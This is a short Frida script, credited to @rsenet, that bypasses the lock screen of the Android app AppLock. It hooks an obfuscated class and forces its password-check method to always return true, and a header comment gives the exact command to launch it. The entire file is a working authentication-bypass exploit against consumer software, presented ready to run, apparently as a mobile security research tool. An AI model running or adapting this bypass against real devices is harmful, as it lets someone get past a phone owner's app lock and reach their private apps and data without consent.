/* 
    Description: AppLock Authentication ByPass
    Usage: frida -U -f com.domobile.applock -l AppLock-authentication-bypass.js
    Credit: @rsenet

    Link:
        https://play.google.com/store/apps/details?id=com.domobile.applockwatcher&hl=en&gl=US
*/

Java.perform(function () 
{
    Java.choose("com.domobile.applock.hh", 
    {
        onMatch : function(instance)
        { 
            console.log("Found instance: " + instance);

            var appLock = Java.use("com.domobile.applock.hh");

            appLock.b.overload("android.content.Context", "java.lang.String", "java.lang.String").implementation = function()
            {
                return true;
            }

            console.log("[x] - AppLock authentication ByPass");
        },

    onComplete:function(){}
    });    
});